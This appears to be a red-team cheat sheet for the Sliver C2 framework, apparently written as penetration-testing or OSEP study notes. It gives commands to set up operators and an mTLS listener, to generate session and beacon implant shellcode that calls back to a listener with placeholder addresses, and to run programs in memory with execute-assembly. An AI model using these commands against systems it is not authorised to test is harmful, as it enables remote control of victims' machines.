---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Sliver C2

## Set Up

### Create operator client config

{% code overflow="wrap" %}
```sh
sliver-server operator -n sliver-client -l 127.0.0.1 -s ~/.sliver-client/configs/sliver-client.cfg
```
{% endcode %}

### Run multiplayer mode

{% code overflow="wrap" %}
```sh
sliver-server
[server] sliver > multiplayer
```
{% endcode %}

### Run the client

{% code overflow="wrap" %}
```sh
sliver-client
```
{% endcode %}

## Listeners

### mTLS

{% code overflow="wrap" %}
```sh
mtls -l <listener_port>
```
{% endcode %}

## Generate Payloads

### Sessions

{% code overflow="wrap" %}
```sh
generate --disable-sgn --skip-symbols --format shellcode --mtls <listener_ip>:<listener_port> --name <session_name> --save <output>
```
{% endcode %}

### Beacons

{% code overflow="wrap" %}
```sh
generate beacon --seconds 30 --jitter 3 --disable-sgn --skip-symbols --format shellcode --mtls <listener_ip>:<listener_port> --name <session_name> --save <output>
```
{% endcode %}

## Execute Assembly

{% code overflow="wrap" %}
```sh
execute-assembly -i -E <program>
```
{% endcode %}

## Resources

* [https://github.com/seriotonctf/Red-Team-Notes/blob/main/Getting%20started%20with%20Sliver%20C2.md](https://github.com/seriotonctf/Red-Team-Notes/blob/main/Getting%20started%20with%20Sliver%20C2.md)
* [https://bishopfox.com/blog/passing-the-osep-exam-using-sliver](https://bishopfox.com/blog/passing-the-osep-exam-using-sliver)
